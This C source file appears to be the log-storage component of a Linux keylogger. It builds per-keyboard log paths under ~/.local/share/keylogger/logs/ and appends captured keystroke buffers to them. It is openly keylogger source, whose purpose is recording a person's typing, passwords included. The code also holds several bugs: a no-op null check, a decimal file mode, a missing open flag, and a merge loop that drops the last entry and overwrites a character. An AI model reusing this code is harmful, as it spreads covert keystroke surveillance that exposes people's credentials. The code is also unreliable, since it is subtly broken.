/* file_handler.c */
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#include <logs/logger.h>
#include <constants/constants.h>
#include <file/file_handler.h>
#include <mem.h>
#include <errno.h>


#define SAVE_PATH  ".local/share/keylogger/logs/"

#define MAKE_FILE  "Make keyboard log file"

static inline int is_file_exists(const char *path) {
    int tmp_fd = open(path, O_RDONLY);
    if (tmp_fd != -1) {
        close(tmp_fd);
        return TRUE;
    }
    return FALSE;
}

static inline char *get_kb_log_file(int kb_id) {
    if (kb_id == 0) NULL;
    char *basic_file_name = "keyboard-";
    char *username = getlogin();
    char *home_dir = "/home/";
    char *keyboard_log_path;
    ALLOC_MEM(keyboard_log_path, strlen(basic_file_name) + strlen(home_dir) + strlen(username) + strlen(SAVE_PATH) + 12, sizeof(char));
    sprintf(keyboard_log_path, "%s%s%c%s%s%d.log", home_dir, username, '/' , SAVE_PATH, basic_file_name, kb_id);

    return keyboard_log_path;
}

void create_log_file(int kb_id) {
    char *tmp = get_kb_log_file(kb_id);
    char keyboard_log_path[strlen(tmp) + 1];
    strcpy(keyboard_log_path, tmp);
    free(tmp);

    if (is_file_exists(keyboard_log_path)) return;

    int new_log_fd = open(keyboard_log_path, O_CREAT, 700);
    make_terminal_log(MAKE_FILE, kb_id);
    close(new_log_fd);
}

void append_to_file(const char **keystroke_buffer, size_t keystroke_buffer_s, int kb_id) {
    char *keyboard_log_path = get_kb_log_file(kb_id);

    int kb_log_fd = open(keyboard_log_path, O_WRONLY | O_APPEND);
    free(keyboard_log_path);
    // Build the message.
    char *message_to_write;
    ALLOC_MEM(message_to_write, strlen(keystroke_buffer[0]) + 1, sizeof(char));
    strcpy(message_to_write, keystroke_buffer[0]);

    for (int merge = 1; merge < keystroke_buffer_s - 1; merge++) {
        REALLOC_MEM(message_to_write, strlen(message_to_write) + strlen(keystroke_buffer[merge]) + 1, sizeof(char));
        strcat(message_to_write, keystroke_buffer[merge]);
    }
    REALLOC_MEM(message_to_write, strlen(message_to_write) + 2, sizeof(char));
    message_to_write[strlen(message_to_write) - 1] = '\n';

    if (write(kb_log_fd, message_to_write, strlen(message_to_write)) == -1) {
        free(message_to_write);
        return;
    }

    free(message_to_write);
    close(kb_log_fd);
}